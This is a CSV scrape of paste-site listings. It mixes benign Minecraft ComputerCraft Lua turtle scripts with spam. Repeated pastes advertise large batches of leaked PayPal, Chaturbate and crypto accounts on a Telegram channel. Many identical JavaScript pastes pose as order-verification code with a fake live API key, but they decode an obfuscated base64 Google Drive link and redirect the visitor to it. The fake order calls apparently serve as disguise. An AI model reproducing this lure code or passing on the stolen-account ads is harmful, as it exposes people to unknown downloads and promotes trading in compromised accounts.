id,title,username,language,date,content
jbXj5TCy,PayPal with Balance,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:17:31 PM CDT,82955 Accounts Posted On https://t.me/leakzbyeminem
eg8CgKXG,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 06:02:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WJSdtLvV,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 06:02:06 PM CDT,41094 Accounts Posted On https://t.me/leakzbyeminem
NcPPMjSp,BoreThrough.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:53:40 PM CDT,"-- rewrite of borethrough (lost turtle)
-- generic tunnel through whatever until you hit air (with sand/gravel tolerance)

 while not turtle.forward() do
   turtle.digUp()
   turtle.dig()
   turtle.forward()
--  turtle.digDown()
  -- note it doesn't necessarily detect fluids
   turtle.placeDown() -- just so I have something to walk on if there's air below but not in front
 end
-- come back a bit in case it parks in lava
turtle.turnRight()
turtle.turnRight()
for x=1,16 do
  turtle.Forward()
end
"
Ppb7czuL,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 05:46:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49511/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S6krKLqz,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:46:44 PM CDT,43126 Accounts Posted On https://t.me/leakzbyeminem
8cAJAG4D,stairsUP.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:41:43 PM CDT,"-- Rewrite of my usual stairsUp program
maxheight=64
x=0
do while not turtle.forward() and x~=maxheight
  turtle.placeDown()
  turtle.up()
  x=x+1
end"
xkbAUSBx,Untitled,kammex,JavaScript,Wednesday 30th of April 2025 05:31:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29649/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Zh08z4DP,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:31:22 PM CDT,27279 Accounts Posted On https://t.me/leakzbyeminem
ypw1WRQa,init.lua,Ubidibity,Lua,Wednesday 30th of April 2025 05:16:08 PM CDT,"-- Initialize turtle.
-- So, I lose a lot of turtles.  I drop them by mistake, send them off with programmatic errors that send them into oblivion
-- or I get distracted by an ore vein and can't find my way back to the turtle.
-- at any case each time what gets me the most is having to reacquire all my programs.
-- This init.lua program is intended to just pull all my 'usual' turtle programs, it's intended to be run once to create a
-- default turtle with the standard tools I like, such as goForward, goUp, goDown, boxmining, etc.
-- I'm incorporating the update program function so you can also re-run it to bulk update programs for older turtles


local function updateProgram(pastebinCode, programName)
  print(""Starting update process for "" .. programName .. ""..."")
  if fs.exists(programName) then
    print(""Deleting old version of "" .. programName .. ""..."")
    fs.delete(programName)
    if not fs.exists(programName) then
      print(""Old version deleted successfully."")
    else
      error(""Failed to delete old version of "" .. programName)
    end
  else
    print(""No old version of "" .. programName .. "" found."")
  end

  print(""Downloading new version from Pastebin..."")
  local success = shell.run(""pastebin"", ""get"", pastebinCode, programName)
  if success then
    print(""Successfully downloaded "" .. programName .. "" from Pastebin."")
    print(""Update complete! You can now run "" .. programName .. ""."")
  else
    error(""Failed to download "" .. programName .. "" from Pastebin. Check the Pastebin code or internet connection."")
  end
end

local programName = ""boxmining.lua""
local pastebinCode = ""9LGhh30Y""
updateProgram(pastebinCode, programName)

local programName = ""simp_tree.lua""
local pastebinCode = ""59cssnQ2""
updateProgram(pastebinCode, programName)

local programName = ""downramp.lua""
local pastebinCode = ""M5w7bYQ1""
updateProgram(pastebinCode, programName)

local programName = ""clayminer.lua""
local pastebinCode = ""6mKBdMvD""
updateProgram(pastebinCode, programName)

local programName = ""floor.lua""
local pastebinCode = ""BmpxvsU0""
updateProgram(pastebinCode, programName)

local programName = ""stairsUp.lua""
local pastebinCode = ""8cAJAG4D""
updateProgram(pastebinCode, programName)

local programName = ""borethrough.lua""
local pastebinCode = ""NcPPMjSp""
updateProgram(pastebinCode, programName)

"
2Y8trr1E,Products.js,kammex,JavaScript,Wednesday 30th of April 2025 05:16:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27587/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SyNStMw2,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:16:00 PM CDT,70735 Accounts Posted On https://t.me/leakzbyeminem
tY0XYDS6,Order.js,kammex,JavaScript,Wednesday 30th of April 2025 05:00:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87075/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
E0UrHDZk,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 05:00:39 PM CDT,30476 Accounts Posted On https://t.me/leakzbyeminem
AYzRnBgF,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 04:45:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02790/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1m2PjWdP,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:45:16 PM CDT,02115 Accounts Posted On https://t.me/leakzbyeminem
bEdqYFvq,Untitled,kammex,JavaScript,Wednesday 30th of April 2025 04:29:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96452/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mBRfAEw2,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:29:54 PM CDT,39933 Accounts Posted On https://t.me/leakzbyeminem
xNYdeUXJ,Key,PurpleDragonUntitled,Lua,Wednesday 30th of April 2025 04:23:22 PM CDT,Key Is Dyanosaur
khywq2sb,Products.js,kammex,JavaScript,Wednesday 30th of April 2025 04:14:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rR40McJT,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 04:14:32 PM CDT,20278 Accounts Posted On https://t.me/leakzbyeminem
SE281CPw,Order.js,kammex,JavaScript,Wednesday 30th of April 2025 03:59:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42337/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gfcNPM7U,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 03:59:10 PM CDT,75424 Accounts Posted On https://t.me/leakzbyeminem
P0S1KFpX,Market.js,kammex,JavaScript,Wednesday 30th of April 2025 03:43:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42506/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EsLQRiw1,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 03:43:47 PM CDT,46206 Accounts Posted On https://t.me/leakzbyeminem
